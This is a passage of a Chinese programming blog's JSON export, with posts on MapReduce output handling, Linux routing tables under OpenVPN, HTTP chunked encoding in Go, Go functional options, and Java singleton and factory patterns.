/gfs/test/freq-00001-of-00100），每个 reduce 实际上是先写一个相互隔离的临时文件的。也就是说，即便是同一个 reduce 任务的不同实例，写入的临时文件也是不同的。在整个 reduce 任务完成后，框架将这个临时文件更名为最终输出文件的名字，而对于 GFS 而言，更名操作是原子性的，这就保证了最终输出文件的完整性。 但是仔细考虑 reduce，会发现很可能最终 MapReduce 执行完成后，GFS 上因为重试而保存了多份同样的内容，其中之一作为最终的输出文件，剩下的都是临时文件，这显得有些冗余。但是，其实 GFS 本身保证写入操作的一致性就是“至少一次”，也就是说，使用 GFS 写入文件时（实际上是追加写），本身就可能产生多份重复的内容，只不过在读取时不会感知到。因此，MapReduce 导致的这份“冗余”，在这样的环境下就显得合情合理了。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"【好文翻译】如何解读路由表中的信息","slug":"Interpreting-Routing-Table","date":"2022-06-11T14:48:08.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/06/11/Interpreting-Routing-Table/","link":"","permalink":"/2022/06/11/Interpreting-Routing-Table/","excerpt":"","text":"前言为了了解 ip route 命令显示的信息有什么含义，以及它对 Linux 收发网络包的影响，我在网络上搜索了很多文章，但是这些文章多数都仅仅是按序描述每个字段的作用，没有通过具体的例子来加深印象。偶然间，在 Diego Assencio 大大的个人网站里发现了这篇文章，拜读之后感觉收获颇丰。 这篇文章给出了两个例子，第一个例子是常见的网络访问，第二个则是在 VPN 环境下的网络访问，通过阅读这篇文章，至少对于我而言有种茅塞顿开的感觉，尤其是后面 VPN 的例子，读完后就能更好地了解容器网络或虚拟机网络的实现方式。 所以本文尝试翻译 Diego Assencio 的文章，一方面做一个初次翻译的尝试，一方面备份在这里方便未来自己的阅读，侵删。 正文这篇文章将会描述如何解读 Linux 系统中路由表的信息。所谓路由表其实就是一个包含了许多路由规则的表单，网络包会根据它的目的地址来选择使用其中的哪条规则。 为了更好地理解这篇文章描述的内容，读者必须先理解两件事情：CIDR 表示法（这东西以 &lt;network-prefix&gt;/&lt;netmask-length&gt; 的格式来声明一个 IP 地址的子网）以及最长前缀匹配算法（译者注：事实上，对 tun/tap 设备的了解也是必须的，这对于理解下文 VPN 的例子尤其重要）。如果读者目前还不了解它们，请先花一些时间来学习，然后再继续阅读本文。此外，我们接下来要描述的例子都基于 IPv4 网络，但是相关的概念对 IPv6 网络也同样适用。 在 Linux 系统上，主要有两个命令用于获取路由表信息：route 和 ip。本文将使用 ip 命令，因为它输出的内容比 route 命令更加易于解读。为了使用 ip 命令来显示操作系统中路由表的内容，请打开一个终端模拟器（terminal），然后运行下面的命令： 1ip route show 这个命令的输出取决于机器的网络配置以及实际的网络拓扑。比如让我们来考虑一个通过无线网络连接到路由器以访问外部网络的机器，机器的 IP 地址为 192.168.1.100，而路由器的地址为 192.168.1.1，那么 ip 命令的输出就有可能如下： 12default via 192.168.1.1 dev wlan0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100 让我们从第二行开始解读这个输出。这一行表示“任何被发往 192.168.1.0/24 这个网络的包都会以 192.168.1.100 作为源地址，然后被 wlan0 这个设备发送出去”，192.168.1.100 这个地址是 DHCP 服务端为 wlan0 设备分配的地址。而剩下的部分则可能不那么有趣：proto kernel 表示这条路由是被操作系统内核在自动配置期间创建的；而 scope link 则表示在 192.168.1.0/24 这个网络中的目标地址都仅对 wlan0 这个设备有效。 而这个输出中的第一行则表示所有网络包的默认路由（即，当没有其他路由可以被使用时，网络包将使用这一条路由）。具体含义指网络包将被 wlan0 设备发送到默认网关（译者注：通常就是指家用路由器），而这个网关的地址是 192.168.1.1。 ip 这个命令的输入非常灵活，例如可以只输入命令的一部分，然后这个输入就会被 ip 命令自动在内部进行补全。举例来说，下面所有的命令实际上都是等价的： 1234ip r sip r showip ro ship route show 接下来让我们来考虑一个更复杂的例子，当设备连接到一个虚拟专用网络（VPN）时，所有网络流量都会经过一个加密隧道（tunnel）被发送到 VPN 服务端。我们以一个 OpenVPN 的网络作为例子，在这个例子中，我们有如下设备及其 IP 地址： tun0：192.168.254.10 wlan0：192.168.1.100 路由器：192.168.1.1 OpenVPN 服务端：95.91.22.94 一个网络包在被发往目的地的途中会经历如下的流程： 1原始网络包 --&gt; tun0 -加密后的网络包-&gt; wlan0 --&gt; 路由器 --&gt; OpenVPN 服务端 -解密后的网络包-&gt; 目的地 首先，一个虚拟网络设备（通常叫做 tun0）会被创建，然后一些路由信息会被加入到路由表中，这些信息引导几乎所有的流量经过 tun0 这个设备，在这里网络包会被加密，然后最终通过 wlan0 这个网络设备被发送到 OpenVPN 的服务端。 下面是一种可能的路由表输出，这个输出来源于一个已经连接到 OpenVPN 服务端的设备（也就是 OpenVPN 的客户端）： 12345670.0.0.0/1 via 192.168.254.9 dev tun0default via 192.168.1.1 dev wlan095.91.22.94 via 192.168.1.1 dev wlan0128.0.0.0/1 via 192.168.254.9 dev tun0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100192.168.254.0/24 via 192.168.254.9 dev tun0192.168.254.9 dev tun0 proto kernel scope link src 192.168.254.10 直接解释这个路由表中的所有细节显得有些单调乏味，所以我们将关注这些输出中的重点部分。请注意第二行：这个设备上的默认路由并没有发生变化。然而，第一行和第四行引入了两条新的路由规则，这将完全改变游戏的规则：被发送到 0.0.0.0/1 和 128.0.0.0/1 两个网络的所有网络包都会经过 tun0 设备，并且以 192.168.254.9 作为网关的地址。 这里需要注意的是，0.0.0.0/1 和 128.0.0.0/1 分别匹配目标地址的第一个比特位为 0 和 1 的网络包。当它们一起工作时，就可以代替第二行的规则成为新的默认路由规则。因为对于任何一个网络包而言，它的目标地址的第一个比特位不是 0 就是 1，而根据最长前缀匹配算法，网络包将优先选择这两条规则（译者注：可以认为 default 路由中目标地址子网掩码的长度为 0）。因此，当 OpenVPN 进程为主机创建了这两条路由后，所有的网络包都会默认被发往 tun0 设备，而从这里开始，网络包就会被加密发送到 95.91.22.94（OpenVPN 服务端的地址）。显而易见，上面输出中的第三行描述了这部分内容：被发往 95.91.22.94 的网络包都由 wlan0 设备以 192.168.1.1 作为网关发出。 一些读者可能会好奇上面的输出中 192.168.254.9 这个地址，那么它是怎么来的呢？事实上，OpenVPN 在创建 tun0 设备时是以 point-to-point 模式创建的，这意味着这个设备在工作时就好像直接连接在另一端上（译者注：也就是不需要通过中间路由器进行转发），而这个 192.168.254.9 就是另一端的设备，它实际上就是 OpenVPN 的服务端。服务端负责创建 192.168.254.0/24 这个虚拟网络，然后从地址池中选出空闲的 IP 地址分配给那些连接到自己的主机。如上面输出的最后一行所示，192.168.254.10 就是这个路由表所在的主机被分配到的地址，而 192.168.254.9 则是服务端在这个虚拟网络中的地址。 读者可以通过运行下面的例子来更清晰地证明上面的描述： 1ip addr show dev tun0 对于我们的例子而言，这条命令的输出可以非常清晰地展示前文所述的 point-to-point 连接（注意倒数第二行）： 123421: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 link/none inet 192.168.254.10 peer 192.168.254.9/32 scope global tun0 valid_lft forever preferred_lft forever 说明这篇文章描述了两个路由表影响网络包收发的例子，如果读者不了解 tun/tap 设备，在阅读 VPN 部分时可能会比较吃力。 简单来说，这种设备可以由系统中的某一个进程打开，然后进程可以选择读取或写入这个设备，如果有网络包被发送到这个设备，那么进程就可以从中读取到数据，和常规的 socket 不同的是，tun 设备可以读取到 IP 层的内容，tap 设备则可以读取到链路层的内容。所以如果进程在收到网络包后将它包装在一个常规的 tcp 或 udp 包中，再经过物理网卡发送到外部网络的某台主机上，那么这台目标主机在解包后就可以看到原始的 IP 包或链路层的内容，从而好像内部的这个网络包直接到达了主机上，以此营造出源主机和目标主机在这个内部网络包层面是相互可达的假象，这种虚拟化技术被叫做 Overlay 网络，如今被广泛运用于容器或虚拟机技术中。 于是在上面 VPN 的例子中，192.168.254.0/24 实际上就是内部网络包的源地址与目的地址所属的网络，而 OpenVPN 的实际网络地址其实是 95.91.22.94，也就是说，如果没有 OpenVPN 创建的 tun 设备，主机通过正常的网络只能访问 95.91.22.94 这个地址。 其他我的大学老师曾对我说，计算机领域要研究的内容总是离不开计算、存储和网络，这句话在近期深入学习容器技术的过程中不断出现在我的脑海里。 Diego Assencio 大大的原文中让我眼前一亮的其实就是 VPN 这个例子，它也是 flannel 项目最初实现的 udp 后端的核心原理，帮助我理解了更多网络方面的有趣知识。笔者对这篇文章的出现表示衷心的感谢。","categories":[{"name":"网络","slug":"网络","permalink":"/categories/网络/"}],"tags":[]},{"title":"浅谈 Http Chunked Encoding","slug":"HTTP-Chunked-Encoding","date":"2022-05-04T11:55:52.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/05/04/HTTP-Chunked-Encoding/","link":"","permalink":"/2022/05/04/HTTP-Chunked-Encoding/","excerpt":"","text":"前言在 HTTP 的消息头（即请求头和响应头）中，有一个叫 Content-Length 的字段，用于表示消息体的大小。早期版本的 HTTP 通过服务端发起的断开连接来表示一个消息的结束，这种方式在多数情况下都工作的很好，但是它存在两个比较严重的问题。第一是，在没有一个表示完整消息大小的字段来帮助检查的情况下，客户端无法得知连接的断开是正常情况还是由于消息的传输发生了异常；第二是，在多个 HTTP 消息共用同一个 TCP 连接的场景下，客户端无法找到不同消息间的边界。 所以，HTTP 的规范要求 Content-Length 字段是必须被提供的（虽然实际测试时发现如果服务端没有提供，很多工具依然会将关闭连接作为默认的消息边界）。 但是，有种消息，它是没有这个字段的，取而代之地使用另一种方式来确保消息的完整性，它就是这篇文章的主角，Chunked Encoding，一种消息的传输编码（Transfer Encoding）。 Chunked Encoding 与 curl我最早了解到 Chunked Encoding 恰恰是在用 curl 来测试服务端不提供 Content-Length 会发生什么时。一般来讲，如果你使用 HTTP 的框架提供服务，那么这个消息头是会被框架来处理的。所以最简单的一种绕过框架、发送一个没有这个字段的响应的方式，就是直接使用 TCP，比如在 golang 中你可以编写这样的代码： 123456789101112131415161718192021func TCPServer() &#123; listener, err := net.Listen(\"tcp\", \"localhost:8080\") if err != nil &#123; panic(err) &#125; for &#123; conn, err := listener.Accept() if err != nil &#123; panic(err) &#125; go func() &#123; defer conn.Close() conn.Write([]byte(\"HTTP/1.1 200 OK\\r\\n\" + \"Date: Wed, 04 May 2022 12:38:41 GMT\\r\\n\" + \"Content-Type: text/plain; charset=utf-8\\r\\n\" + \"\\r\\n1234567890\")) &#125;() &#125;&#125; 代码不是很标准，因为这个程序没有读取请求而直接发送响应，不过这无伤大雅。代码主要做的事情就是发送一个没有 Content-Length 请求头字段的响应，但是在请求体里有 1234567890 这样的内容。这时如果执行它，并且使用 curl -v localhost:8080，那么在 curl 的输出中可以发现 no chunk, no close, no size. Assume close to signal end 这样的输出，这证明了我在前言中的描述。 那么，Chunked Encoding 的响应体是什么样的呢，为什么它会被 curl 区别对待？我们仍然可以用 golang 和 curl 进行测试。 golang 的 http 包本身就支持 Chunked Encoding，它的 http.ResponseWriter 接口可以被显式转换成 Flusher 接口，这个接口提供一个 Flush 方法，如果调用它，那么它会以 Chunked Encoding 方式处理发送的内容，于是我们可以编写这样的代码： 123456789101112131415161718func HTTPServer() &#123; http.HandleFunc(\"/\", func(rw http.ResponseWriter, r *http.Request) &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; for i := 0; i &lt; 5; i++ &#123; rw.Write([]byte(fmt.Sprintf(\"message #%d\\n\", i))) flusher.Flush() time.Sleep(time.Second) &#125; &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125; 这段代码试图分五次发送响应体，每次间隔一秒钟。如果我们使用 curl -v localhost:8080 ，那么会发现响应体确实如预期一般每隔一秒发送一部分，同时响应头中有 Transfer-Encoding: chunked 这样的字段表示这个响应是以 Chunked Encoding 的方式被发送的，而且这个响应也确实没有 Content-Length 这个字段。 更进一步的，如果再为 curl 加上 –raw 参数，也就是使用 curl -v --raw localhost:8080，那么就可以获取原始的响应体内容，这个命令的结果是这样的： 12345678910111213141516bmessage #0bmessage #1bmessage #2bmessage #3bmessage #40 再进一步，如果命令变成了 curl -v --raw localhost:8080 | hexdump -C ，就可以得到这样的响应体内容： 123456700000000 62 0d 0a 6d 65 73 73 61 67 65 20 23 30 0a 0d 0a |b..message #0...|00000010 62 0d 0a 6d 65 73 73 61 67 65 20 23 31 0a 0d 0a |b..message #1...|00000020 62 0d 0a 6d 65 73 73 61 67 65 20 23 32 0a 0d 0a |b..message #2...|00000030 62 0d 0a 6d 65 73 73 61 67 65 20 23 33 0a 0d 0a |b..message #3...|00000040 62 0d 0a 6d 65 73 73 61 67 65 20 23 34 0a 0d 0a |b..message #4...|00000050 30 0d 0a 0d 0a |0....|00000055 这样看来就很明显了：Chunked Encoding 发送的每一部分响应体，都会以一个 16 进制的数字作为开始，这个数字表示这部分响应体的长度，后面接 \\r\\n ，然后是具体的响应体内容，再接 \\r\\n标记这部分响应的结束（上面例子中倒数第三列的 0a 是前面 fmt.Sprintf(&quot;message #%d\\n&quot;, i) 中的 \\n，并不是 Chunked Encoding 的结构）。最终，以 0 表示整个响应的结束，由于长度为 0，那么紧随其后的只有两个 \\r\\n。 Chunked Encoding 与 Golang http 的客户端golang 对 Chunked Encoding 的支持不仅限于服务端，比如我们还是使用上面的代码作为服务端，但是编写这样的代码来作为客户端： 1234567891011121314151617181920func HTTPClient() &#123; rsp, err := http.Get(\"http://localhost:8080\") if err != nil &#123; panic(err) &#125; buf := make([]byte, 512) for &#123; len, err := rsp.Body.Read(buf) if err != nil &#123; if err == io.EOF &#123; fmt.Println(\"Done\") return &#125; panic(err) &#125; fmt.Println(len, string(buf[:len])) &#125;&#125; 那么在运行它后，会得到如下的输出（每部分同样会间隔一秒）： 123456789101111 message #011 message #111 message #211 message #311 message #4Done 通过前面的内容我们可以知道，响应体的内容是包含长度、\\r\\n、部分响应体内容的，但是如果我们直接使用 golang 的 http.Response.Body.Read 方法，就可以直接拿到响应体的有效内容部分，不需要我们自己去做一些额外的操作（比如读取长度，跳过CRLF，验证长度等等）。 Chunked Encoding 与 Golang http 的服务端现在让我们把关注点放回到服务端上，不难想象，这种不需要提前计算 Content-Length、动态持续生成内容的消息类型，在一定程度上是可以实现 Websocket 的功能的，因为常规 HTTP 的痛点就在于它是一问一答的形式，而且回答的内容在被发送前就要确定下来。事实上，如果读者熟悉 Kubernetes 的 watch 机制，就会知道它是同时支持 Chunked Encoding 和 Websocket 两种方式的。 所以我们可以编写下面这样的一个小例子来演示 Chunked Encoding 的这种能力： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport ( \"fmt\" \"net/http\" \"sync\")// 用来线程安全地对 connections 变量使用 appendvar globalLock = &amp;sync.Mutex&#123;&#125;// 用来保存所有的 Connection 对象var connections []*Connectionfunc main() &#123; // 创建一个 Connection 对象，并将它放入 connections 切片中 http.HandleFunc(\"/watch\", func(rw http.ResponseWriter, r *http.Request) &#123; c := NewConnection(rw) globalLock.Lock() fmt.Println(\"Append one\") connections = append(connections, c) globalLock.Unlock() c.Send(\"Start Watching...\\n\") select &#123;&#125; // 避免函数退出，从而保留住连接，这会有协程泄露的问题，但是这里先不管 &#125;) // 对 connections 中的所有连接发送一条消息 http.HandleFunc(\"/send\", func(rw http.ResponseWriter, r *http.Request) &#123; msg := r.URL.Query().Get(\"msg\") for _, c := range connections &#123; fmt.Println(\"Send one\") c.Send(msg + \"\\n\") // 这里加一个回车方便观察 &#125; rw.Write([]byte(\"Done\")) &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125;// 代表一个 Chunked Encoding 连接，提供 Send 方法用于发送一部分响应体type Connection struct &#123; rw http.ResponseWriter flusher http.Flusher lock *sync.Mutex&#125;func NewConnection(rw http.ResponseWriter) *Connection &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; return &amp;Connection&#123;rw, flusher, &amp;sync.Mutex&#123;&#125;&#125;&#125;// 以 Chunked Encoding 的方式发送响应体的一部分func (c *Connection) Send(msg string) &#123; // 这里的加锁是必须的，因为下面的操作并不是原子的 // 而多协程同时写响应体会导致 Chunked Encoding 的结构乱掉，从而引发客户端异常 c.lock.Lock() defer c.lock.Unlock() c.rw.Write([]byte(msg)) c.flusher.Flush()&#125; 代码有些长，主要的功能是提供了 /watch 和 /send 两个 path，前者用于和服务端保持一个连接，并从这个连接中接受被服务端下发的内容，后者则可以传递一个 msg 的 query 参数，其内容会被广播给所有的 Chunked Encoding 连接。 运行这个程序，然后多准备几个终端窗口，均执行 curl -v localhost:8080/watch，待它们都显示 Start Watching... 消息后，再打开一个终端窗口，执行 curl localhost:8080/send\\?msg=aaaaa，就可以发现前面的所有窗口都收到了 aaaaa 这个消息。而这，其实本质上和 k8s 的 watch 机制是一样的。 上面的代码仅仅起到抛砖引玉的作用，由于 Chunked Encoding 在一定程度上提供了类似全双工通信的能力，我们完全可以基于它实现更多，比如实时消息推送、聊天室等等。 杂谈最近辞掉了公司实习生的身份，距离毕业后回去做正式员工还有大概一个多月的时间，想在这段时间内好好休息一下。由于手头的工作就只有毕业设计和毕业论文，便有了更充足的时间来兴趣驱动地学一些东西。近期在读《HTTP-The-Definitive-Guide》这本书，主要目的是更深入地了解一些 HTTP 的特性，其次也想借此锻炼一下自己的英语阅读能力。 不过我是乱序读的，目前暂定的阅读顺序是 HTTPS -&gt; Entity&amp;Encoding -&gt; Connection Management -&gt; Cookie -&gt; Cache，其他的内容就按需添加。 这篇文章就是我在阅读了 Entity &amp; Encoding 部分后，针对 http chunked encoding 这个特性的一个总结与实践。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"},{"name":"网络","slug":"网络","permalink":"/categories/网络/"}],"tags":[]},{"title":"Functional-Options","slug":"Functional-Options","date":"2021-04-29T16:04:32.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2021/04/30/Functional-Options/","link":"","permalink":"/2021/04/30/Functional-Options/","excerpt":"","text":"0x00 前言到了大三，学校的课设开始不限制实现的语言了，考虑到为未来打基础，于是我大部分的课设都使用 Golang 来完成，以期在实践中逐渐熟练这门简洁却高效的语言。 在使用的过程中，经常会遇见对结构体进行初始化的需求，如果只是简单的字段还好，直接通过字面量来初始化即可，然而对于一些拥有复杂结构及依赖的结构体，其初始化不论是用户友好性还是可读性上都不适合使用字面量来初始化，在 Golang 的标准库中通常采用返回结构体指针的 New 函数来实现（如 list.New，sync.NewCond），这样在函数中屏蔽了相关的实现细节，以让用户能够聚焦在简单的使用上。 然而，Golang 目前并不支持函数的重载，这导致 New 函数的特征标（signature）是写死的，函数需要什么参数，用户就只能传递什么参数来初始化相应的字段。如果想达到前文所述的易用，那么参数就不该设置得太多；但是如果想给用户足够的能力来按需设置结构体，那么参数就不该设置得太少，这使得开发者很难找到一个平衡点，来设计方便高效的参数进行初始化。 有没有什么方法，能使用同一个初始化函数，通过提供不同的参数来完成对结构体不同程度的初始化呢？ 0x01 解决方法及原理最近在逛左耳耗子老师的博客的时候偶然看到了如题所述的 Functional Options 模式，该模式非常优雅地利用闭包和可变参数等性质来解决了前文所述的问题，下面给出一个例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\")type Person struct &#123; name string age int hobby string&#125;type withFunc func(*Person)func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125;func withAge(age int) withFunc &#123; return func(p *Person) &#123; p.age = age &#125;&#125;func withHobby(hobby string) withFunc &#123; return func(p *Person) &#123; p.hobby = hobby &#125;&#125;func makePerson(funcs ...withFunc) *Person &#123; ret := &amp;Person&#123;&#125; for _, f := range funcs &#123; f(ret) &#125; return ret&#125;func main() &#123; p1 := makePerson(withName(\"Yuren\")) p2 := makePerson(withName(\"Yuren\"), withAge(21)) p3 := makePerson(withName(\"Yuren\"), withAge(21), withHobby(\"Program\")) fmt.Printf(\"%+v\\n%+v\\n%+v\\n\", p1, p2, p3)&#125; 对于所谓的 New 函数，我个人比较习惯于将其命名为 make+结构体名 的形式，这里就请忽略这个非常不 Golang 的函数名，转而聚焦到函数的实现上。 可以看到，makePerson 函数本身接收一个 withFuncs 的可变参数列表，withFuncs 作为一种类型定义，其本质上是一个需要传递 Person 指针的函数。按照这种特征标，代码中的 withName，withAge 和 withHobby 的返回值都是符合 withFuncs 类型的实现，由于这三者原理上相同，这里只用 withName 来举例。 12345func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125; withName 的函数定义如上，可以看到其返回了一个 withFunc 类型的函数。该函数利用闭包将传递给外层 withName 的 name 参数绑定在其作用域内，使得 withFunc 函数返回后依然具备访问 name 变量的能力，而该函数本身做的事情就是将传递进来的 Person 指针指向的实例中的 name 字段设置为 name 变量的值。 具体的 Person 指针的传递发生在 makePerson 函数调用的时候，即 p1~p3 处，在调用时传递了需要的 with* 函数的调用，将其返回的 withFunc 类型的函数放到了 makePerson 的参数列表中。 makePerson 做的事情就是用待返回的 Person 指针来消耗可变参数列表中的 withFunc 函数，以使其内部的字段被函数初始化成闭包内保留的值。 0x2 总结本文试图通过抛出笔者平时遇到的结构体初始化的矛盾，进而通过学习给出相应的解决办法，同时阐述相关的原理。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"设计模式之单例模式","slug":"DesignPattern-Singleton","date":"2020-11-13T11:44:23.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/11/13/DesignPattern-Singleton/","link":"","permalink":"/2020/11/13/DesignPattern-Singleton/","excerpt":"","text":"0x0 前言单例模式是一个比较简单的模式，其目的在于确保某一个类只有一个实例，并且自行实例化并向整个系统提供这个实例。一般来说，对于一些创建、销毁比较昂贵的对象实例，也许使用单例模式是一个不错的选择。比如一个始终需要从键盘获取用户输入的系统，我们可以在类似 Utils 的静态类中设置一个全局唯一的Scanner类，始终用于获取用户的输入，从而避免每次创建删除同类对象产生的开销。 0x1 基本代码很多设计模式相关的教程上都将单例模式分为饿汉单例和懒汉单例，它们的基本代码如下： 123456789101112131415161718192021222324// 饿汉单例class Singleton &#123; static private Singleton instance = new Singleton(); private Singleton() &#123;&#125; public static Singleton getInstance() &#123; return instance; &#125;&#125;// 懒汉单例（线程不安全）class Singleton &#123; static private Singleton instance = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 可以看到，为了限制客户端对该对象的多次实例化，两者的 constructor 均被设置为 private 可见性，并对外暴露静态方法 getInstance 用于返回内部的实例。区别在于，懒汉单例应用了 lazy loading 的思想，使得 instance 的实例化延迟到 getInstance 方法真正被调用时；而饿汉单例借助了 ClassLoader 的能力，让 instance 的实例化在 Singleton 类被加载时便进行了。 0x2 懒汉单例与线程安全就像上面的注释所言，上述形式的懒汉模式并不是线程安全的，原因在于 instance == null 这句判断在并发的场景下是非常靠不住的，比如如下的代码： 123456789101112131415161718192021222324public class App &#123; public static void main(String[] args) &#123; for (int i=0; i&lt;5; i++) &#123; new Thread(() -&gt; &#123; Singleton.getInstance(); &#125;).start(); &#125; &#125;&#125;class Singleton &#123; static private Singleton instance = null; private Singleton() &#123; System.out.println(\"An instance has been created\"); &#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 在笔者的设备上共输出了5次 An instance has been created ，也就是产生了5个不同的对象，这并不符合单例模式。 针对上述问题，可以通过 synchronized 关键字对代码进行加锁，从而在保证线程安全的条件下实现懒汉单例。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"设计模式之工厂模式","slug":"DesignPattern-FactoryPattern","date":"2020-11-05T12:41:00.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/11/05/DesignPattern-FactoryPattern/","link":"","permalink":"/2020/11/05/DesignPattern-FactoryPattern/","excerpt":"","text":"0x0 简单（静态）工厂模式一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。 但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。 更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样： 1Reader bufferedReader = new BufferedReader(new FileReader(new File(...))) 如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。 简单工厂模式就可以很好地解决上述这些问题。 要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂： 123456789class ReaderFactory &#123; // constructor 设置为 private，因为这个工厂内部只需要静态方法即可 private ReaderFactory() &#123;&#125; public static Reader createReaderForFile(String filename) throws FileNotFoundException &#123; return new BufferedReader(new FileReader(new File(filename))); &#125;&#125; 这样在要获得 Reader 时，可以写类似 Reader bufferedReader = ReaderFactory.createReaderForFile(...) 的代码，而在日后遇到需要修改为 LineNumberReader 的维护需求时，只需要修改工厂中的代码即可。 这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下： 123456789101112131415161718class ReaderFactory &#123; private ReaderFactory() &#123; &#125; public static Reader createReaderForFile(String filename, String readerType) throws FileNotFoundException &#123; Reader fileReader = new FileReader(new File(filename)); switch (readerType) &#123; case \"BufferedReader\": return new BufferedReader(fileReader); case \"LineNumberReader\": return new LineNumberReader(fileReader); ... default: return fileReader; &#125; &#125;&#125; 这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。 虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。 所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。 0x1 工厂方法模式虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。 工厂方法模式就可以很好地解决上述问题。 为了举例，假设我们有一个 Pet 的接口，代码如下： 123interface Pet &#123; void say();&#125; 现在分别定义猫和狗实体类来实现该接口： 12345678910111213class Cat implements Pet &#123; @Override public void say() &#123; System.out.println(\"喵\"); &#125;&#125;class Dog implements Pet &#123; @Override public void say() &#123; System.out.println(\"汪\"); &#125;&#125; 为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂： 123456789101112131415161718192021class PetFactory &#123; private PetFactory() &#123;&#125; private static Pet DEFAULT_PET = new Pet() &#123; @Override public void say() &#123; System.out.println(\"Idk who am I\"); &#125; &#125;; public static Pet createPet(String petType) &#123; switch (petType) &#123; case \"Cat\": return new Cat(); case \"Dog\": return new Dog(); default: return DEFAULT_PET; &#125; &#125;&#125; 这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。 那么同样的需求，如果用工厂方法模式来实现会是什么样呢？ 首先，需要把 PetFactory 从类转为接口： 123interface PetFactory &#123; Pet createPet();&#125; 然后针对 Cat 和 Dog 分别实现其工厂： 1234567891011121314// 这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体class CatFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Cat(); &#125;&#125;class DogFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Dog(); &#125;&#125; 这样，客户端的代码可以这样写 123456public static void main(String[] args) &#123; PetFactory catFactory = new CatFactory(); PetFactory dogFactory = new DogFactory(); catFactory.createPet().say(); dogFactory.createPet().say();&#125; 在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类。 和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。 0x2 抽象工厂模式抽象工厂模式的定义是为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做产品，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个产品族。 